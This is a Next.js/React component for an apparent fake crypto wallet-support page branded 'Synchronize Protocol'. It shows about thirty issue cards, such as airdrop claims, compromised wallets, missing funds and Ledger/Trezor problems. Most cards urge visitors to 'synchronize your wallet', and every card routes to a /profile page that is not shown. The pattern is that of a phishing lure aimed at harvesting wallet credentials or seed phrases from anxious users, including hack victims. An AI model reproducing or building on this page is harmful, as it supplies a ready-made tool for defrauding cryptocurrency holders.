"use client"

import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { ChevronDown } from "lucide-react"
import { useRouter } from "next/navigation"
import { useEffect, useRef, useState } from "react"

export default function Component() {
  const router = useRouter()
  const [visibleCards, setVisibleCards] = useState(new Set([0, 1, 2, 3]))
  const cardRefs = useRef<(HTMLDivElement | null)[]>([])

  const cardData = [
    {
      title: "Migration",
      description: "Click here for migration or anything related to migration",
    },
    {
      title: "General Issues",
      description:
        "For instant solution on any type of issues, click the button below to synchronize your wallet and select Correct Node Strings",
    },
    {
      title: "Swap/Exchange",
      description:
        "We will support you in any related issues with swapping and/or exchange of coins. Kindly click here.",
    },
    {
      title: "Validation",
      description: "For validation related issue, click the button below to synchronize your wallet and select validate Account",
    },
    {
      title: "Claim Presale",
      description: "Are you finding it difficult for Claiming of Presale or any other related issues?",
    },
    {
      title: "Staking Rewards",
      description: "Maximize your earnings through our secure staking platform with competitive APY rates.",
    },
    {
      title: "NFT Marketplace",
      description: "Buy, sell, and trade NFTs on our decentralized marketplace with zero gas fees.",
    },
    {
      title: "DeFi Lending",
      description: "Lend your crypto assets and earn passive income with our automated lending protocols.",
    },
    {
      title: "Cross-Chain Bridge",
      description: "Seamlessly transfer assets across different blockchain networks with our bridge technology.",
    },
    {
      title: "Claim reward",
      description: "For claim, reward enrollment click the button below to synchronize your wallet and obtain your reward",
    },
    {
      title: "Token Bridge",
      description: "For issues with token bridge click the button below to synchronize your wallet and select Enable Bridge",
    },
    {
      title: "Token Rectification",
      description: "For issues with token rectification, click the button below to synchronize your wallet and select Rectify Token Error",
    },
    {
      title: "Buy & Sell",
      description: "For issues with buying and selling, click the button below to synchronize your wallet, then select Buy or Sell",
    },
    {
      title: "Errors Rectification",
      description: "For issues with any errors, click the button below to synchronize your wallet and then select Detect & Fix Error",
    },
    {
      title: "Stake & Unstake",
      description: "For issues with token Staking and Unstaking click the button below to synchronize your wallet and select Enable Stake and Unstake",
    },
    {
      title: "KYC & Whitelist",
      description: "To whitelist or complete LYX click the button below to synchronize your wallet and select Whitelist wallet",
    },
    {
      title: "Claim Airdrop",
      description: "For Airdrop enroll and claim click the button below to synchronize your wallet and select enroll and claim",
    },
    {
      title: "Unable to Access Wallet?",
      description: "Are you unable to access your wallet? click the button below to synchronize your wallet and select regain access",
    },
    {
      title: "Wallet Compromised?",
      description: "Are you a victim of wallet hack? click the button below to synchronize your wallet and hold the transactions.",
    },
    {
      title: "Connect to Dapps",
      description: "Connect decentralised web applications to mobile wallets. Enable DAPP on mobile wallet / Extension.",
    },
    {
      title: "Login Issues",
      description: "Do you have issues logging into your wallet?",
    },
    {
      title: "Transaction Delay",
      description: "Do you have issues with transactions being delayed?",
    },
    {
      title: "Issues with Trading Wallet",
      description: "Issues with Trading Wallet?",
    },
    {
      title: "Unable to Purchase Coins",
      description: "if your account is not recognized as a trusted payment source you may not be able to buy crypto and add coins",
    },
    {
      title: "Locked Account",
      description: "if you are logged out due to activity on the account.",
    },
    {
      title: "Missing Funds/Irregular Balance",
      description: "Lost Access to funds or funds is missing?",
    },
    {
      title: "Bridge Transfer",
      description: "Do you have any issues while trying to transfertokens between chains?.",
    },
    {
      title: "Wallet Glitch Error",
      description: "If you have any glitch issues on your wallet.",
    },
    {
      title: "Slippage",
      description: "For slippage issues or any other related issues.",
    },
    {
      title: "Ledger & Trezor",
      description: "For ledger or Trezor related issues click the button below to synchronize your wallet and select correct node string",
    },
    {
      title: "Missing Funds",
      description: "Lost access to funds or funds is missing?",
    },
    {
      title: "Website not Loading?",
      description: "Are you unable to load exchange website? click the button below to synchronize your wallet and select correct node string",
    },
  ]

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            const index = Number.parseInt(entry.target.getAttribute("data-index") || "0")
            setVisibleCards((prev) => new Set([...prev, index]))
          }
        })
      },
      { threshold: 0.1, rootMargin: "50px" },
    )

    cardRefs.current.forEach((ref) => {
      if (ref) observer.observe(ref)
    })

    return () => observer.disconnect()
  }, [])

  const handleCardClick = () => {
    router.push("/profile")
  }

  return (
    <div className="min-h-screen bg-darkBlueCustom relative overflow-hidden">
      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-20">
        <svg className="w-full h-full" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg">
          <path d="M100,500 Q300,200 500,500 T900,500" stroke="rgba(255,255,255,0.1)" strokeWidth="2" fill="none" />
          <path d="M0,300 Q200,100 400,300 T800,300" stroke="rgba(255,255,255,0.1)" strokeWidth="1" fill="none" />
          <circle cx="100" cy="200" r="3" fill="rgba(255,255,255,0.3)" />
          <circle cx="900" cy="300" r="2" fill="rgba(255,255,255,0.2)" />
          <circle cx="800" cy="700" r="4" fill="rgba(255,255,255,0.1)" />
        </svg>
      </div>

      {/* Crypto Ticker */}
      <div
        className="bg-black/30 backdrop-blur-sm border-b border-white/10"
        style={{ height: "40px", padding: 0, margin: 0, width: "100%" }}
      >
        <iframe
          src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no"
          width="100%"
          height="36px"
          scrolling="auto"
          marginWidth={0}
          marginHeight={0}
          frameBorder="0"
          style={{ border: 0, margin: 0, padding: 0 }}
          title="Cryptocurrency Price Ticker"
        />
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-16">
        <div className="text-center mb-16">
        <Button
            variant="ghost"
            size="sm" // Keep sm for base size, adjust padding manually
            className="bg-white/10 backdrop-blur-sm border border-white/20 hover:bg-white/20 transition-all duration-300 mb-4 px-4 py-1 rounded-full"
          >
            {" "}
            {/* Reduced mb-8 to mb-4, added px-4 py-1, and rounded-full */}
            <span className="bg-gradient-to-r from-purple-400 via-purple-300 to-purple-500 bg-clip-text text-transparent font-bold text-base md:text-lg">
              {" "}
              {/* Reduced text-2xl to text-base and md:text-3xl to md:text-lg */}
              Synchronize Protocol
            </span>
          </Button>

          <p className="text-white text-sm md:text-sm max-w-1xl mx-auto mb-12 leading-relaxed">
            This is a technology, not an app, that allows all noncustodial wallets to create a remote resolution.
          </p>

          <div className="flex flex-col sm:flex-row gap-4 justify-center items-center mb-16">
            
          </div>

          <h2 className="text-1xl text-white mb-12">Make Selection Below</h2>
        </div>

        {/* Cards Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 max-w-7xl mx-auto">
          {cardData.map((card, index) => (
            <div
              key={index}
              ref={(el) => {
                cardRefs.current[index] = el
              }}
              data-index={index}
              className={`transform transition-all duration-700 ease-out ${
                visibleCards.has(index) ? "translate-y-0 opacity-100" : "translate-y-8 opacity-0"
              }`}
              style={{ transitionDelay: `${(index % 4) * 100}ms` }}
            >
              <Card
                className="bg-black/20 backdrop-blur-sm border-white/10 hover:bg-gradient-to-br hover:from-purple-600/20 hover:to-purple-800/20 transition-all duration-300 cursor-pointer group"
                onClick={handleCardClick}
              >
                <CardContent className="p-6 text-center">
                  <h3 className="text-xl font-semibold text-white mb-4 group-hover:text-purple-200 transition-colors">
                    {card.title}
                  </h3>
                  <p className="text-gray-300 text-sm leading-relaxed group-hover:text-gray-200 transition-colors">
                    {card.description}
                  </p>
                </CardContent>
              </Card>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
